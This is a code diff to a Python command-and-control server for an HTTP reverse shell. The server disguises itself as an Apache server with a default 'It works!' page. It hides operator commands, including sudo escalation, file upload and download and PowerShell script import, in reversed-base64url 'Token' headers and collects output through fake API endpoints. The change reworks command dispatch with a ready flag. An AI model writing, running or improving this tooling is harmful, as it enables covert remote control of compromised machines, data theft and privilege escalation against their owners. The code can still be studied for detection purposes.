@@ -13,10 +13,10 @@ import neotermcolor
 from neotermcolor import colored
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
-sudo = False ; root = False
 command = None ; prompt = None
 local_path = None ; remote_path = None
 first_run = True ; wait_for_cmd = False
+sudo = False ; root = False ; cmd_ready = True
 neotermcolor.readline_always_safe = True
 
 banner = """
@@ -75,8 +75,8 @@ class MyServer(BaseHTTPRequestHandler):
             pass
 
     def do_GET(self):
-        global wait_for_cmd ; global root
-        global prompt ; global first_run ; global sudo
+        global wait_for_cmd ; global root ; global sudo
+        global prompt ; global first_run ; global cmd_ready
         global local_path ; global remote_path ; global command 
         self.server_version = "Apache/2.4.18"
         self.sys_version = "(Ubuntu)"
@@ -91,7 +91,7 @@ class MyServer(BaseHTTPRequestHandler):
                     return
 
             elif self.path == "/api/v1/Client/Token":
-                while True:
+                if cmd_ready:
                     if root:
                         whoami = "root"
                     else:
@@ -133,14 +133,14 @@ class MyServer(BaseHTTPRequestHandler):
 
                     if command == "clear" or command == "cls":
                         os.system("clear")
-                        continue
+                        pass
 
                     if "sudo" in command.split()[0]:
                         if not ":" in path:
                             args = oslex.split(command)
                             if len(args) < 2:
                                 print(colored("[!] Usage: sudo command or sudo su\n","red"))
-                                continue
+                                pass
                             else:
                                 if not sudo:
                                     old_cmd = ' '.join(args[1:])
@@ -162,7 +162,7 @@ class MyServer(BaseHTTPRequestHandler):
                         args = oslex.split(command)
                         if len(args) < 3 or len(args) > 3:
                             print(colored("[!] Usage: upload local_file remote_file\n","red"))
-                            continue
+                            pass
                         else:
                             local_path = args[1]
                             remote_path = args[2]
@@ -173,7 +173,7 @@ class MyServer(BaseHTTPRequestHandler):
                         args = oslex.split(command)
                         if len(args) < 3 or len(args) > 3:
                             print(colored("[!] Usage: download local_file remote_file\n","red"))
-                            continue
+                            pass
 
                         else:
                             remote_path = args[1]
@@ -185,7 +185,7 @@ class MyServer(BaseHTTPRequestHandler):
                         args = oslex.split(command)
                         if len(args) < 2 or len(args) > 2:
                             print(colored("[!] Usage: import-ps1 /path/script.ps1\n", "red"))
-                            continue 
+                            pass 
                         
                         else:  
                             try:
@@ -206,24 +206,25 @@ class MyServer(BaseHTTPRequestHandler):
                         print(colored("    clear/cls: Clear terminal screen","blue"))
                         print(colored("    kill: Kill client connection","blue"))
                         print(colored("    exit: Exit from program\n","blue"))
-                        continue
+                        pass
 
                     if command is not None:
                         if root and not "cd" in command:
                             if not wait_for_cmd and not "exit" in command:
                                 old_cmd = command
                                 command = str("printf 'HTTPShellNull'" + " | " + "sudo -S " + old_cmd)
-
-                        first_run = False
-                        encoded_command = "Token: "
-                        encoded_command += self.encode_reversed_base64url(command)
-                        self._set_headers()
-                        self.wfile.write(encoded_command.encode("utf-8"))
-                        if command == "exit":
-                            print (colored("[!] Exiting..\n", "red"))
-                            exit(0)
-                        break
-
+ 
+                first_run = False
+                cmd_ready = False
+                encoded_command = "Token: "
+                encoded_command += self.encode_reversed_base64url(command)
+                self._set_headers()
+                self.wfile.write(encoded_command.encode("utf-8"))
+                
+                if command == "exit":
+                    print (colored("[!] Exiting..\n", "red"))
+                    exit(0)
+                
             else:
                 itworks_message = "<html><body><h1>It works!</h1><p>This is the default web page for this server.<p></body></html>"
                 self.send_response(200)
@@ -235,12 +236,12 @@ class MyServer(BaseHTTPRequestHandler):
         except(AttributeError, UnboundLocalError, BrokenPipeError, ConnectionResetError, IndexError, TypeError):
             pass
 
-        return first_run, command, wait_for_cmd, sudo, root
+        return first_run, command, wait_for_cmd, sudo, root, cmd_ready
 
     def do_POST(self):
-        global wait_for_cmd ; global root
-        global prompt ; global first_run ; global sudo
-        global local_path ; global remote_path ; global command
+        global wait_for_cmd ; global root ; global sudo
+        global prompt ; global first_run ; global cmd_ready
+        global local_path ; global remote_path ; global command 
         self.server_version = "Apache/2.4.18"
         self.sys_version = "(Ubuntu)"
         try:
@@ -263,6 +264,7 @@ class MyServer(BaseHTTPRequestHandler):
                     file_content = self.decode_file_revbase64url(encoded_payload)
                     f.write(file_content)
                     self.wfile.write(response.encode())
+                    cmd_ready = True
                 return
 
             elif self.path == "/api/v1/Client/Debug":
@@ -291,6 +293,7 @@ class MyServer(BaseHTTPRequestHandler):
                     else:
                         print(colored(decoded_payload.rstrip()+"\n", "yellow"))
                 self.wfile.write(response.encode())
+                cmd_ready = True
 
             elif self.path == "/api/v1/Client/Error":
                 if not first_run and command is not None:
@@ -332,6 +335,7 @@ class MyServer(BaseHTTPRequestHandler):
                     else:
                         print(colored(decoded_payload.rstrip()+"\n", "red")) 
                 self.wfile.write(response.encode())
+                cmd_ready = True
 
             else:
                 itworks_message = "<html><body><h1>It works!</h1><p>This is the default web page for this server.<p></body></html>"
@@ -340,11 +344,12 @@ class MyServer(BaseHTTPRequestHandler):
                 self.send_header("Content-Length", len(itworks_message))
                 self.end_headers()
                 self.wfile.write(itworks_message.encode())
+                cmd_ready = True
 
         except:
             pass
 
-        return prompt
+        return prompt, cmd_ready
 
     def log_message(self, format, *args):
             pass
